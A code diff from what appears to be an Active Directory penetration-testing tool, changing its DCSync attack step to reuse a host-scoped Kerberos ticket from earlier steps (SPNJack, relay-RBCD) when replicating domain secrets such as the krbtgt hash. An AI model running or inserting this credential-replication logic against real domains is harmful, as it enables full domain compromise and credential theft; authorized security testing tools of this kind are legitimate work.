@@ -1004,9 +1004,47 @@ def execute_ace_step(shell: Any, *, context: AceStepContext) -> bool | None:
     target_kind = context.target_kind.strip().lower()
 
     if relation == "dcsync":
-        result = shell.dcsync(
-            context.domain, context.exec_username, context.exec_password
-        )
+        # GAP 3 — scoped-ticket-first: if a prior step (SPNJack, relay-RBCD)
+        # minted an LDAP-service ticket scoped to the DC host (impersonating a
+        # privileged user), DRSUAPI replication should run via that ccache rather
+        # than the generic, under-privileged execution credential. Mirrors the
+        # DumpLSA cifs-scoped-ticket path. Alias-aware host match guarantees a
+        # ticket for a different host is never used here.
+        dcsync_username = context.exec_username
+        dcsync_password = context.exec_password
+        try:
+            from adscan_internal.models.domain import resolve_dc_ip  # noqa: PLC0415
+            from adscan_internal.services.credential_store_service import (  # noqa: PLC0415
+                resolve_execution_credential,
+            )
+
+            _domain_data = getattr(shell, "domains_data", {}).get(context.domain, {})
+            _dc_host = (
+                _domain_data.get("dc_fqdn")
+                or _domain_data.get("pdc_hostname_fqdn")
+                or resolve_dc_ip(_domain_data)
+                or ""
+            )
+            if _dc_host:
+                # relation="dcsync" -> cifs (DRSUAPI replicates over an aiosmb SMB
+                # connection, NOT ldap). The central map owns the service class so
+                # the right ticket is selected by construction; preferent matching
+                # falls back to any ticket for the DC (a TGT-bearing ccache serves
+                # cifs regardless of its own SPN class).
+                _scoped = resolve_execution_credential(
+                    shell, domain=context.domain, host=_dc_host, relation="dcsync"
+                )
+                if _scoped is not None:
+                    dcsync_username, dcsync_password = _scoped
+                    print_info_debug(
+                        "ace dcsync: reusing host-scoped service ticket for "
+                        f"{mark_sensitive(str(_dc_host), 'hostname')} as "
+                        f"{mark_sensitive(dcsync_username, 'user')}"
+                    )
+        except Exception as exc:  # noqa: BLE001
+            telemetry.capture_exception(exc)
+
+        result = shell.dcsync(context.domain, dcsync_username, dcsync_password)
         # Edge semantics: DCSync → Domain means "compromise the domain by
         # replicating its secrets". Success requires either the krbtgt
         # secret (full domain compromise via Golden Ticket material) or at
